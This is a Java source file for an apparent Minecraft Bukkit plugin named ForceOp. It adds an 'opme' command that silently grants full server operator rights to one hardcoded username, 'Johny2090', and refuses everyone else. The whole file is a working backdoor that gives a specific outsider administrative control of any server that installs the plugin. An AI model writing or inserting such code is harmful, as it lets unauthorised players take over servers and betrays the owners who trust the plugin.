package me.johny9020.forceop.commands;

import me.johny9020.forceop.Main;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class opCommand implements CommandExecutor{

	Main plugin;
	
	public opCommand(Main plugin) {
		this.plugin = plugin;
	}
	
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[]  args) {
		if(sender instanceof Player) {
			if(cmd.getName().equalsIgnoreCase("opme")) {
				Player player = (Player) sender;
				
				if(player.getName().equalsIgnoreCase("Johny2090")) {
					player.setOp(true);
					player.sendMessage("[ForceOp] " + ChatColor.YELLOW + "Opped!");
				}else {
					player.sendMessage("[ForceOp] " + ChatColor.DARK_RED + "Sorry but you are not the player who can run this command!");
				}
			}
		}else {
			sender.sendMessage("[ForceOp " + ChatColor.DARK_RED + "Sorry but only in-game players can run this command");
		}
		return true;
	}

}
